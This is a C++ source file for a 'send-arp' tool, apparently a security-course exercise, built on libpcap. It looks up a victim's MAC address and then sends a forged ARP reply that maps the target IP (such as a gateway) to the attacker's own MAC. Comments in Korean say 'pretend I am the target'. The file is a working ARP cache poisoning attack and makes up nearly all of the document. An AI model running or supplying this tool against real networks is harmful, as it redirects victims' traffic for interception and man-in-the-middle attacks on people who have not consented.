#include <cstdio>
#include <pcap.h>
#include <iostream>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>
#include <unistd.h>
#include <cstring>

#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
    printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

std::string getMyIp(const char* dev) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    struct ifreq ifr{};
    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);

    if (ioctl(fd, SIOCGIFADDR, &ifr) != 0) {
        std::cerr << "Failed to get IP address\n";
        exit(1);
    }
    close(fd);

    struct sockaddr_in* ipaddr = (struct sockaddr_in*)&ifr.ifr_addr;
    char ipStr[INET_ADDRSTRLEN];
    inet_ntop(AF_INET, &ipaddr->sin_addr, ipStr, INET_ADDRSTRLEN);
    return std::string(ipStr);
}

std::string getMyMac(const char* dev) {
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    struct ifreq ifr{};
    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);
    ioctl(fd, SIOCGIFHWADDR, &ifr);
    close(fd);

    char macStr[18];
    for (int i = 0; i < 6; ++i)
        sprintf(&macStr[i * 3], "%02X:", (unsigned char)ifr.ifr_hwaddr.sa_data[i]);
    macStr[17] = '\0';
    return std::string(macStr);
}

Mac getYourMac(pcap_t* pcap, const std::string& myMac, const std::string& myIp, const std::string& senderIp) {
    EthArpPacket packet{};

    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    packet.eth_.smac_ = Mac(myMac);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(ArpHdr::Request);
    packet.arp_.smac_ = Mac(myMac);
    packet.arp_.sip_ = htonl(Ip(myIp));
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(Ip(senderIp));

    pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* recvPacket;
        int res = pcap_next_ex(pcap, &header, &recvPacket);
        if (res == 0) continue;
        if (res < 0) {
            std::cerr << "pcap_next_ex failed: " << pcap_geterr(pcap) << "\n";
            continue;
        }

        EthHdr* eth = (EthHdr*)recvPacket;
        if (eth->type() != EthHdr::Arp) continue;

        ArpHdr* arp = (ArpHdr*)(recvPacket + sizeof(EthHdr));
        if (arp->op() == ArpHdr::Reply && arp->sip() == Ip(senderIp)) {
            return arp->smac();
        }
    }
}

void sendArp(pcap_t* pcap, const std::string& myMac, const std::string& targetIp, const std::string& senderIp, const Mac& senderMac) {
    EthArpPacket packet{};

    packet.eth_.dmac_ = senderMac;
    packet.eth_.smac_ = Mac(myMac);
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(ArpHdr::Reply); // 핵심: Reply로 변경!
    packet.arp_.smac_ = Mac(myMac);
    packet.arp_.sip_ = htonl(Ip(targetIp)); // 내가 target인 척
    packet.arp_.tmac_ = senderMac;
    packet.arp_.tip_ = htonl(Ip(senderIp));

    pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    std::cout << "Sent ARP to " << senderIp <<"\n";
}

int main(int argc, char* argv[]) {
    if (argc < 4 || argc % 2 != 0) {
        usage();
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];

    std::string myIp = getMyIp(dev);
    std::string myMac = getMyMac(dev);

    std::cout << "My IP: " << myIp << "\n";
    std::cout << "My MAC: " << myMac << "\n";

    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (pcap == nullptr) {
        std::cerr << "Could not open device " << dev << " (" << errbuf << ")\n";
        return -1;
    }

    for (int i = 1; i < argc / 2; ++i) {
        std::string senderIp = argv[2 * i];
        std::string targetIp = argv[2 * i + 1];

        std::cout << "\nGetting MAC for sender IP: " << senderIp << "...\n";
        Mac senderMac = getYourMac(pcap, myMac, myIp, senderIp);
        std::cout << "    => MAC: " << std::string(senderMac) << "\n";

        sendArp(pcap, myMac, targetIp, senderIp, senderMac);
    }

    pcap_close(pcap);
    return 0;
}

